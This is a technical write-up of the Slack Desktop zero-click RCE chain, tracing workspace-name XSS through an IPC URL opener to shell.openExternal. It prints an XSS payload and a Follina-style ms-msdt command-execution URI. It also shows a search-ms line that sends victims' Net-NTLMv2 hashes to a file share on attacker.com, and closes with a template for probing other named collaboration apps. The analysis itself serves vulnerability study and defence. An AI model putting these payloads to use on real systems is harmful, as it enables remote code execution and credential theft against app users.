---
title: Slack RCE Chain
description: Oskars Vegeris's $30,000 zero-click Slack RCE — workspace metadata XSS to IPC to shell.openExternal
---

# Slack RCE Chain — Technical Deep Dive

This is one of the most cited Electron vulnerabilities because it's so clean. Every step is simple. Every step is predictable in retrospect. And yet it sat in Slack Desktop — installed on millions of machines — until Oskars Vegeris found it and received a $30,000 payout from HackerOne.

Full CVE summary: [Slack HN-783877](../cves/slack-hn-783877.md). This page is the technical breakdown.

---

## The Chain in One Line

Attacker sets a malicious workspace name → victim opens Slack → XSS fires → calls URL opener → `shell.openExternal` → Windows protocol handler → OS executes code.

Zero clicks. Zero interaction beyond opening the app.

```
Workspace name field (server-controlled)
  → Rendered automatically in Slack UI
  → XSS fires in renderer
  → window.slackDesktop.openURL(attacker_url)
  → ipcRenderer.invoke('open-url', attacker_url)
  → ipcMain handler calls shell.openExternal(attacker_url)
  → OS dispatches to protocol handler → RCE
```

---

## Step 1: The XSS Vector

The interesting design decision here is *where* the XSS was. Not in user messages — Slack had sanitization there. It was in workspace *metadata*: the workspace name, displayed throughout the UI every time you switch workspaces, shown in the taskbar, in notifications, in the sidebar.

Workspace admins can set workspace names. Slack's API lets you set names that include HTML. The Desktop app renders that name in the UI. The rendering didn't go through the same sanitization pipeline as messages.

```
Attacker (workspace admin) sets workspace name via Slack API:
  "Legitimate Corp<img src=x onerror=slackRCE()>"

Slack stores this on their servers.

Victim connects to this workspace:
  Slack Desktop fetches workspace info automatically.
  Renders workspace name in UI.
  <img src=x onerror=slackRCE()> evaluates.
  slackRCE() runs.
```

The assumption that server-maintained workspace metadata is "trusted" compared to user messages is what created the gap. Metadata rendered without sanitization because it didn't come from chat — but workspace names can be set by anyone with admin access to a workspace.

---

## Step 2: The Preload Bridge

Slack's preload exposed a URL handling mechanism. This existed for legitimate reasons: clicking a link in a Slack message should open the system browser, clicking a `slack://` deep link should navigate within the app, and both needed to go through a single controlled path.

That controlled path was exposed to the renderer:

```javascript
// Simplified from Slack's pre-patch preload:
contextBridge.exposeInMainWorld('slackDesktop', {
  openURL: (url) => ipcRenderer.invoke('open-url', url)
  // or via Slack's internal dispatch system:
  // dispatch({ type: 'OPEN_URL_ACTION', payload: { url } })
});
```

This is a very reasonable API design for non-adversarial conditions. You need to open URLs. You expose a function that opens URLs. The problem is what the IPC handler on the other end does with a URL you don't control.

---

## Step 3: The Main Process Handler

```javascript
// main.js (pre-patch, simplified):
ipcMain.handle('open-url', async (event, url) => {
  if (url.startsWith('slack://')) {
    return handleSlackDeepLink(url);  // internal navigation
  }
  
  // Everything else: hand off to the OS
  await shell.openExternal(url);      // ← the sink, no validation
});
```

No URL validation. No scheme allowlist. Whatever the renderer sends, the OS gets.

The XSS payload in the workspace name calls `window.slackDesktop.openURL('ms-msdt://...')`. The main process handler receives `'ms-msdt://...'`. `shell.openExternal` passes it to the OS. The OS knows `ms-msdt://` — it's Windows MSDT, the Follina vector.

---

## The OS Protocol Piece

```
shell.openExternal('ms-msdt:/id PCWDiagnostic /skip force /param "..."')
→ Windows dispatches to MSDT (Microsoft Support Diagnostic Tool)
→ MSDT processes embedded command parameter
→ Arbitrary command execution
```

This is the Follina technique: a Windows protocol handler that, when invoked with specific parameters, executes a command. `shell.openExternal` is how you invoke an OS protocol handler from an Electron app.

Pre-Follina, similar impact was achievable via:
```
search-ms:query=&crumb=location:file://attacker.com/share
→ Windows Explorer opens, attempts NTLM auth to attacker's share
→ Net-NTLMv2 hash captured → crack offline or relay to another service
```

---

## Why Zero-Click Matters for the Bounty

The $30,000 payout reflects what zero-click means at scale:

- **Interaction required**: attacker sends a malicious message, victim clicks it → some fraction of users click
- **Zero-click**: attacker controls workspace name, victim opens Slack → 100% of workspace members are affected, automatically, every time they open Slack

At Slack's user count, the difference between "click to exploit" and "open app to exploit" is the difference between targeted and mass exploitation. The bounty reflected that.

---

## The Pattern Repeats

What makes this case study worth studying is that every piece of it is generic:

1. **Collaboration app** — server-provided content rendered in the app → every Slack, Teams, Discord, Mattermost, RocketChat
2. **Metadata injection** — non-message fields with less scrutiny → workspace names, channel descriptions, user profiles, notification previews
3. **URL opening bridge** — every app that opens links has a `shell.openExternal` call and a preload bridge to reach it
4. **No scheme validation** — extremely common; developers validate that URLs look like URLs, not that the scheme is safe

The template:

```
Find: server content rendered without sanitization
      (doesn't have to be chat messages — look at metadata, profiles, titles)
      
Trace: to the URL opening mechanism
      (every collaboration app has one)
      
Exploit: via a Windows protocol handler
      (ms-msdt, search-ms, file://, or just https:// phishing)
```

Check every Electron collaboration app you work on against this pattern. It finds bugs.

**Apps where this template is worth checking:**
- Mattermost Desktop
- RocketChat Desktop
- Basecamp Desktop
- Notion Desktop (CVE-2024-23743 followed a similar pattern)
- Figma Desktop
- Any app rendering server-provided content that also opens URLs
